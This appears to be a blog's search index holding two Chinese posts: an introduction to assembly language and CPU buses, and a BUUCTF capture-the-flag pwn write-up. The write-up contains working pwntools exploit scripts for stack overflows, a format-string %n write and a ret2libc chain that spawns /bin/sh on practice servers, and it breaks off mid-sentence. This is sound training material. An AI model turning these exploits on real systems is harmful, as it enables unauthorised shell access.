<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一、基础知识</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-汇编语言简介"><a href="#1-汇编语言简介" class="headerlink" title="1. 汇编语言简介"></a>1. 汇编语言简介</h2><p><em><strong>从机器语言到汇编语言：</strong></em></p><p><strong>机器语言</strong>：由“0”“1”数字编成，以二进制为基础表示电子器件的高低电平，从而执行机器指令，进行运算。</p><p>明显弊端：难以书写和阅读，复杂难懂。</p><p>于是，程序员写出了编译器来翻译机器语言，汇编语言诞生了。</p><p><strong>汇编语言</strong>：主体为汇编指令。如“mov ax,bx”。操作对象为CPU、寄存器和内存。</p><h2 id="2-CPU基本工作原理"><a href="#2-CPU基本工作原理" class="headerlink" title="2. CPU基本工作原理"></a>2. CPU基本工作原理</h2><blockquote><p>CPU 是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据。指令和数据在存储器中存放，也就是我们平时所说的内存。 </p></blockquote><h3 id="2-1-存储单元、指令和数据"><a href="#2-1-存储单元、指令和数据" class="headerlink" title="2.1 存储单元、指令和数据"></a>2.1 存储单元、指令和数据</h3><p><strong>指令和数据：</strong></p><blockquote><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。<strong>CPU 在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。</strong>（）</p></blockquote><p><strong>存储单元：</strong></p><blockquote><p>存储器被划分成若干个存储单元，每个存储单元从0开始顺序编号。一个存储器能存储128个Byte。</p></blockquote><p>内存计量单位：<br>8bit&#x3D;1B   1KB&#x3D;1024B   1MB&#x3D;1024KB            1GB&#x3D;1024MB   1TB&#x3D;1024GB</p><h3 id="2-2-CPU对存储器的读写"><a href="#2-2-CPU对存储器的读写" class="headerlink" title="2.2 CPU对存储器的读写"></a>2.2 CPU对存储器的读写</h3><blockquote><p>存储器被划分成多个存储单元，存储单元从零开始顺序编号。这些编号可以看作存储单元在存储器中的<strong>地址</strong>。<br>CPU 要从内存中读数据，<strong>首先要指定存储单元的地址</strong><br>CPU 在读写数据时还要指明，它要对哪一个器件进行操作，进行哪种操作，是从中读出数据，还是向里面写入数据。</p></blockquote><p>可见，CPU想进行数据的读写需要和外部器件进行以下三类信息交互：</p><ul><li>存储单元的地址(<strong>地址信息</strong>);</li><li>器件的选择，读或写的命令(<strong>控制信息</strong>); </li><li>读或写的数据(<strong>数据信息</strong>)。</li></ul><h3 id="2-3-三大总线"><a href="#2-3-三大总线" class="headerlink" title="2.3 三大总线"></a>2.3 三大总线</h3><p>CPU通过导线将电信号传到存储器芯片中，从而实现信息的交互。</p><blockquote><p>在计算机中专门有连接 CPU 和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。 根据传送信息的不同，总线从逻辑上又分为3类，<strong>地址总线、控制总线和数据总线</strong>。<br>示例：<br><img src="/../images/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/6e940afe0acd49fb81f16f36f82aea32.png" alt="传输图例"><br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。<br>(3) 存储器将3号单元中的数据8通过数据线送入CPU。<br>写操作与读操作的步骤相似。如向3号单元写入数据26:<br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存写命令，选中存储器芯片，并通知它，要向其中写入数据。<br>(3) CPU通过数据线將数据26送入内存的3号单元中。</p></blockquote><p>要让一个计算机或微处理器工作，应向它输入能够驱动它进行工作的电平信息(机器码)。CPU 按收这条机器码后将完成我们上面所述的读写工作。 机器码难于记忆，用汇编指令来表示，情况如下。<br>机器码: 10100001 00000011 00000000<br>对应的汇编指令:MOV AX,[3]<br>含义: 传送3号单元的内容入AX</p><p><strong>由此可见，汇编指令可以方便地直接对CPU进行操作。</strong></p><blockquote><p><strong>地址总线：</strong> CPU是通过地址总线来指定存储器单元的，地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。<br>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N。这样的CPU可以寻找2ⁿ个内存单元。</p></blockquote><blockquote><p><strong>数据总线：</strong> CPU与内存或其他器件之间的数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。<br>8根数据总线一次可传送一个8位二进制数据(即一个字节)。16根数据总线一次可传送两个字节。</p></blockquote><blockquote><p><strong>控制总线：</strong> CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着 CPU 提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU 对外部器件的控制能力。</p></blockquote><ul><li>地址总线的宽度决定了CPU 的寻址能力;</li><li>数据总线的宽度决定了CPU 与其他器件进行数据传送时的一次数据传送量: </li><li>控制总线的宽度决定了CPU 对系统中其他器件的控制能力。</li></ul><h2 id="3-内存地址空间"><a href="#3-内存地址空间" class="headerlink" title="3. 内存地址空间"></a>3. 内存地址空间</h2><p>CPU在操控存储器的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是我们所说的内存地址空间。</p><p><img src="/../images/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/fa1df46f566545759f03dc1f1d22a794.png" alt="逻辑存储器"><br>在图1. 8中，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。</p><blockquote><p>内存地址空间的大小受CPU地址总线宽度的限制。8086CPU的地址总线宽度为20，可以传送2²⁰个不同的地址信息(大小从0至2²⁰−1)。即可定位2²⁰个内存单元，则8086PC的内存地址空间大小为1MB。同理，80386CPU的地址总线宽度为32，则内存地址空间最大为4GB。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF（1~10）</title>
    <link href="/2023/07/30/BUUCTF/1~10/"/>
    <url>/2023/07/30/BUUCTF/1~10/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF（1-10）"><a href="#BUUCTF（1-10）" class="headerlink" title="BUUCTF（1~10）"></a>BUUCTF（1~10）</h1><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>运行，直接利用system函数“cat flag”即可。</p><h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230405162937267.png" alt="2.1"></p><p>发现gets危险输入</p><p><img src="/../images/BUUCTF/image-20230405163225751.png" alt="2.2"></p><p>看到fun函数调用了“system”，找到fun的地址 0x401186</p><p>则利用gets溢出返回到fun函数地址即可</p><h3 id="2-Payload"><a href="#2-Payload" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = remote(&quot;node4.buuoj.cn&quot;,28996)<br><br>system_addr = 0x401186<br>sh.sendline(b&#x27;A&#x27;*15+b&#x27;a&#x27;*8 + p64(system_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><strong>PS</strong>：有时栈的大小未知，需要利用GDB调试出偏移地址的大小。</p><h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h2><h3 id="1-解题思路-1"><a href="#1-解题思路-1" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230405164743647.png" alt="3.1"></p><p>发现flag提示</p><p><img src="/../images/BUUCTF/image-20230405164659197.png" alt="3.2"></p><p>找到调用system的函数地址：0x400611</p><p><img src="/../images/BUUCTF/image-20230405165018347.png" alt="3.3"></p><p><img src="/../images/BUUCTF/image-20230405170440308.png" alt="3.4"></p><h3 id="2-GDB调试找偏移地址"><a href="#2-GDB调试找偏移地址" class="headerlink" title="(2)GDB调试找偏移地址"></a>(2)<em>GDB调试找偏移地址</em></h3><p>1.打断点</p><p><img src="/../images/BUUCTF/image-20230405175926725.png" alt="point1"></p><p>2.先 r 一下</p><p><strong>3.利用cyclic函数生成构造的字符串队列，作为程序的输入。</strong></p><img src="../images/BUUCTF/image-20230405181049487.png" alt="point2"><p><strong>4.利用”cyclic -l 中断字符串“计算得出偏移：</strong></p><p><img src="/../images/BUUCTF/image-20230405181318593.png" alt="point3"></p><p><strong>PS</strong>：由于char构造的字符数组在实际分配内存时会多占用一个字节的内存。多出来的一个字节用来存储”\0”用来表示字符串的结束。</p><p>故所得偏移地址为64字节，即0x40为栈的大小。</p><h3 id="3-Payload"><a href="#3-Payload" class="headerlink" title="(3)Payload"></a>(3)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>sh = remote(&#x27;node4.buuoj.cn&#x27;,29352)<br>payload=B&#x27;a&#x27;*(0x40+8)+p64(0x400611)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h2><h3 id="1-解题思路-2"><a href="#1-解题思路-2" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230406192357497.png" alt="4.1"></p><p>进入fun( )函数中</p><p><img src="/../images/BUUCTF/image-20230406192445828.png" alt="4.2"></p><p><strong>发现需要利用gets函数溢出到v2的地址，并修改v2的值为11.28125，从而返回system函数拿到flag。</strong></p><p>找到v2和v1的地址</p><p> <img src="/../images/BUUCTF/image-20230406193412024.png" alt="4.3"></p><p>偏移地址&#x3D;0x30-0x04&#x3D;0x2c</p><p>11.28125&#x3D;0x41348000</p><h3 id="2-Payload-1"><a href="#2-Payload-1" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,26573)<br>payload=B&#x27;a&#x27;*0x2c+p64(0x41348000)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h2><h3 id="1-解题思路-3"><a href="#1-解题思路-3" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230405113611488.png" alt="5.1"></p><p>发现只有一个“vuln()”函数，点进去</p><p><img src="/../images/BUUCTF/image-20230405113743751.png" alt="5.2"></p><p>在网上搜索大佬的解释，发现fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，但是这个程序有点意思的地方就在于<strong>会将一个字节的“I”替换成三个字节的“you”</strong><br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用！</p><p><img src="/../images/BUUCTF/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70.png" alt="5.2"></p><p>然后用 <kbd>Shift</kbd>+<kbd>F12</kbd> 来查看程序里的字符串</p><p><img src="/../images/BUUCTF/image-20230405114511713.png" alt="5.3"></p><p>发现有明显的flag提示</p><p>找到调用“system”函数的地址</p><p><img src="/../images/BUUCTF/image-20230405142650865.png" alt="5.4"></p><p><img src="/../images/BUUCTF/image-20230405145102227.png" alt="5.5"></p><h3 id="2-Payload-2"><a href="#2-Payload-2" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br>r=remote(&quot;node4.buuoj.cn&quot;,26622)<br>flag_addr=0x8048F0D<br>payload=B&#x27;I&#x27;*20+B&#x27;a&#x27;*4+p32(flag_addr)<br><br>r.sendline(payload)<br><br>r.interactive() <br></code></pre></td></tr></table></figure><h2 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h2><h3 id="1-解题思路-4"><a href="#1-解题思路-4" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230406203902084.png" alt="image-20230406203902084"></p><p><img src="/../images/BUUCTF/image-20230406203930751.png" alt="image-20230406203930751"></p><p><strong>可以利用read函数制造栈溢出。</strong></p><p>在函数列表中发现调用system函数的提示</p><p><img src="/../images/BUUCTF/image-20230406204054142.png" alt="image-20230406204054142"></p><p>果然</p><p><img src="/../images/BUUCTF/image-20230406203837624.png" alt="image-20230406203837624"></p><p>记录该函数地址：0x400596</p><p>GDB调试出偏移地址为136字节，即0x88为栈的大小。</p><h3 id="2-Payload-3"><a href="#2-Payload-3" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,29850)<br>payload=B&#x27;a&#x27;*0x88+p64(0x400596)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-第五空间2019-决赛-PWN5-Canary绕过"><a href="#7-第五空间2019-决赛-PWN5-Canary绕过" class="headerlink" title="7.[第五空间2019 决赛]PWN5 (Canary绕过)"></a>7.[第五空间2019 决赛]PWN5 (Canary绕过)</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h3><p><img src="/../images/BUUCTF/image-20230406212118370.png"></p><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230406210826989.png" alt="image-20230406210826989"></p><p>根据网上的解释，函数的功能是读入一个4位的随机密码，再将我们输入的密码与随机生成数比较，相同就执行system。</p><p>这里面的printf（）存在<strong>格式化字符串漏洞</strong></p><h3 id="printf（）格式化字符串漏洞"><a href="#printf（）格式化字符串漏洞" class="headerlink" title="printf（）格式化字符串漏洞"></a>printf（）格式化字符串漏洞</h3><p><img src="/../images/BUUCTF/image-20230409172725613.png" alt="image-20230409172725613"></p><p><img src="/../images/BUUCTF/image-20230409172805370.png" alt="image-20230409172805370"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用 “AAAA %08x %08x %8x %08x %08x %08x %08x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，即首地址偏移或者偏移量</p><p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p><p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据</p><p>首先我们要定位到我们输入的字符串在栈上的位置。</p><p>我们输入的参数是在栈上的第10个，后面可以直接利用 %10$ 定位到这个位置。<br>随机生成函数的位置是0x804c044开始的，长度为4字节,依次+1即可。</p><p>所以可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这这个地址里的内容</p><h3 id="绕过Canary保护机制"><a href="#绕过Canary保护机制" class="headerlink" title="绕过Canary保护机制"></a>绕过Canary保护机制</h3><p>先用GDB运行一下</p><p><img src="/../images/BUUCTF/image-20230409173022608.png" alt="image-20230409173022608"></p><p>发现”AAAA“的ASCII编码“41414141”离首字节有10个字符串，故输入的字符定位在函数栈上的第10个位置，后面可以直接利用 %10$ 定位到这个位置。</p><p><img src="/../images/BUUCTF/image-20230409180312194.png" alt="image-20230409180312194"></p><p>从主函数中能看到随机生成函数的位置是0x804C044开始的，长度为4字节,依次+1即可。</p><p>所以可以用<code>%10$,%11$,%12$,%13$</code>去定位到这4个地址，再用%n修改这这个地址里的内容，因此构造payload</p><h3 id="2-Payload-4"><a href="#2-Payload-4" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>c = remote(&quot;node4.buuoj.cn&quot;,28635)<br><br>payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)<br>payload+=B&#x27;%10$n%11$n%12$n%13$n&#x27;<br><br>c.sendline(payload)<br>c.sendline(str(0x10101010))<br>c.interactive()<br></code></pre></td></tr></table></figure><p><strong>payload分析：</strong></p><blockquote><ol><li><p><code>payload = p32(0x804c044) + p32(0x804c045) + p32(0x804c046) + p32(0x804c047)</code>：构造一个字符串，其中包含4个32位整数，分别是<code>0x804c044</code>、<code>0x804c045</code>、<code>0x804c046</code>和<code>0x804c047</code>。这些整数是用于指定格式化字符串漏洞中待写入的地址。</p></li><li><p><code>payload += b&#39;%10$n%11$n%12$n%13$n&#39;</code>：在已构造的字符串后追加一个格式化字符串，其中使用了格式化字符串的特殊格式<code>%n</code>。<code>%n</code>的作用是将前面的字符数（即已输出的字符数）写入到对应的地址中。具体来说，<code>%10$n</code>表示将已输出的字符数写入到第10个参数所指向的地址中，<code>%11$n</code>表示将已输出的字符数写入到第11个参数所指向的地址中，以此类推。</p></li></ol><p>利用格式化字符串漏洞，将已输出的字符数写入到指定的地址中。通过在payload中指定不同的地址，可以将相应的值写入到这些地址中。根据payload中的内容，第10个参数的地址将被写入<code>0x804c044</code>，第11个参数的地址将被写入<code>0x804c045</code>，以此类推。这样，当程序执行到这个payload时，它会将已输出的字符数写入到指定的地址中，实现对这些地址的写入操作从而覆盖原有的canary保护。</p></blockquote><p><img src="/../images/BUUCTF/image-20230409181837890.png" alt="image-20230409181837890"></p><h2 id="8-ciscn-2019-c-1-libc泄露地址"><a href="#8-ciscn-2019-c-1-libc泄露地址" class="headerlink" title="8.ciscn_2019_c_1 (libc泄露地址)"></a>8.ciscn_2019_c_1 (libc泄露地址)</h2><h3 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h3><p>例行检查</p><p><img src="/../images/BUUCTF/image-20230414204605444.png" alt="image-20230414204605444"></p><p>开启了栈不可执行，因此shellcode方法失效</p><p>用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/BUUCTF/image-20230414202914812.png" alt="image-20230414202914812"></p><p>尝试先在GDB中运行一下，发现这是一个输入1&#x2F;2&#x2F;3来进入以下三个函数的程序</p><p><img src="/../images/BUUCTF/image-20230414204819897.png" alt="image-20230414204819897"></p><p>进入这三个函数查看，在encrypt函数中发现gets，因此估计是一道ret2libc的题目，由于这是64位程序，寻找”pop、rdi、ret“就行</p><p><img src="/../images/BUUCTF/image-20230530180246796.png" alt="image-20230530180246796"></p><p>使用ROPgadget寻找</p><p><img src="/../images/BUUCTF/image-20230530174718768.png" alt="image-20230530174718768"></p><h3 id="2-Payload-5"><a href="#2-Payload-5" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&quot;./ciscn_2019_c_1&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25096</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>encrypt_addr = elf.symbols[<span class="hljs-string">&quot;encrypt&quot;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>,payload)<br>io.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br>puts_addr = u64(io.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(ret) +p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>脚本分析：</p><blockquote><ol start="4"><li><p><code>elf = ELF(&quot;./ciscn_2019_c_1&quot;)</code>：加载二进制文件<code>ciscn_2019_c_1</code>，并创建一个ELF对象，用于获取二进制文件中的符号信息。</p></li><li><p><code>puts_plt = elf.plt[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的PLT地址。</p></li><li><p><code>puts_got = elf.got[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的GOT地址。</p></li><li><p><code>pop_rdi_ret = 0x400c83</code>：设置<code>pop rdi; ret</code>指令序列的地址，该指令用于将参数加载到RDI寄存器中。</p></li><li><p><code>ret = 0x4006b9</code>：设置<code>ret</code>指令的地址，该指令用于返回函数调用。</p></li><li><p><code>encrypt_addr = elf.symbols[&quot;encrypt&quot;]</code>：从ELF对象中获取<code>encrypt</code>函数的地址。</p></li><li><p><code>main_addr = elf.symbols[&#39;main&#39;]</code>：从ELF对象中获取<code>main</code>函数的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</code>：构造payload用于触发漏洞。payload包括一些填充数据（<code>b&#39;a&#39; * (0x50 + 0x08)</code>）和ROP链。ROP链的作用是构造栈上的一系列指令序列，以实现漏洞利用的目的。具体来说，这个ROP链的作用是调用<code>puts(puts_got)</code>，将<code>puts</code>函数的真实地址泄露出来，以便后续计算libc基址。</p></li><li><p><code>io.sendlineafter(&quot;Input your choice!\n&quot;,str(1))</code>：发送字符串”1”给远程服务，用于选择相应的功能。</p></li><li><p><code>io.sendlineafter(&quot;Input your Plaintext to be encrypted\n&quot;,payload)</code>：发送payload给远程服务，用于触发漏洞。</p></li><li><p><code>io.recvuntil(b&quot;Ciphertext\n&quot;)</code>：接收远程服务发送的数据，直到遇到字符串”Ciphertext\n”。</p></li><li><p><code>io.recvuntil(b&quot;\n&quot;)</code>：接收远程服务发送的数据，直到遇到换行符。</p></li><li><p><code>puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\0&#39;))</code>：接收远程服务发送的数据，将其转换为64位整数，即<code>puts</code>函数的真实地址。</p></li><li><p><code>libc = LibcSearcher(&quot;puts&quot;,puts_addr)</code>：创建LibcSearcher对象，以便后续通过<code>puts</code>函数地址查找libc基址和其他函数地址。</p></li><li><p><code>libcbase = puts_addr - libc.dump(&#39;puts&#39;)</code>：计算libc基址。</p></li><li><p><code>system_addr = libcbase + libc.dump(&#39;system&#39;)</code>：计算<code>system</code>函数的地址。</p></li><li><p><code>str_bin_sh = libcbase + libc.dump(&#39;str_bin_sh&#39;)</code>：计算<code>&quot;/bin/sh&quot;</code>字符串的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(ret) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)</code>：构造新的payload，其中包括填充数据、ROP链和<code>/bin/sh</code>字符串地址。这个ROP链的作用是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p></li></ol></blockquote><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="(3)总结"></a>(3)总结</h3><p>通过漏洞泄露<code>puts</code>函数的真实地址，并计算出libc基址。然后，构造合适的ROP链来调用<code>system</code>函数，并传递<code>&quot;/bin/sh&quot;</code>字符串作为参数，从而获取shell权限。</p><ol><li>找到函数地址：首先，使用<code>ELF</code>模块获取目标二进制文件中函数的地址。在脚本中，通过<code>elf.plt</code>和<code>elf.got</code>来获取<code>puts</code>函数的<code>plt</code>和<code>got</code>表项的地址，以及<code>encrypt</code>和<code>main</code>函数的地址。</li><li>构造漏洞触发payload：在脚本中，通过构造一系列的字节串来构造payload。首先，用<code>b&#39;a&#39; * (0x50 + 0x08)</code>填充到缓冲区，然后利用<code>pop_rdi_ret</code>和<code>puts_got</code>地址，以及<code>puts_plt</code>函数的地址，构造ROP链。最后，使用<code>encrypt</code>函数的地址，将payload发送给目标程序。</li><li>泄露libc基址和获取系统函数地址：通过接收目标程序返回的数据，获取泄露的<code>puts</code>函数的地址。然后，使用<code>LibcSearcher</code>模块根据泄露的<code>puts</code>函数地址来搜索libc库，并计算出libc基址。最后，通过libc基址计算出<code>system</code>函数的地址和<code>/bin/sh</code>字符串的地址。</li><li>构造第二个payload：使用泄露的libc基址、<code>ret</code>指令地址、<code>pop_rdi_ret</code>指令地址和<code>/bin/sh</code>字符串地址，构造第二个payload。ROP链的顺序为：<code>ret</code>、<code>pop_rdi_ret</code>、<code>/bin/sh</code>、<code>system</code>、<code>main</code>。</li><li>发送第二个payload获取shell：将第二个payload发送给目标程序，成功获取到shell。</li></ol><h2 id="9-ciscn-2019-c-8"><a href="#9-ciscn-2019-c-8" class="headerlink" title="9.ciscn_2019_c_8"></a>9.ciscn_2019_c_8</h2><h3 id="1-解题思路-5"><a href="#1-解题思路-5" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，发现保护全开了</p><p><img src="/../images/BUUCTF/image-20230525194900327.png" alt="image-20230525194900327"></p><p>进入IDA看一下</p><p><img src="/../images/BUUCTF/image-20230525195520113.png" alt="image-20230525195520113">发现只需要让var[13] &#x3D; 17 就可以调用system函数了</p><p>这里需要注意：</p><blockquote><p>&#x3D;&#x3D;qword全称是Quad 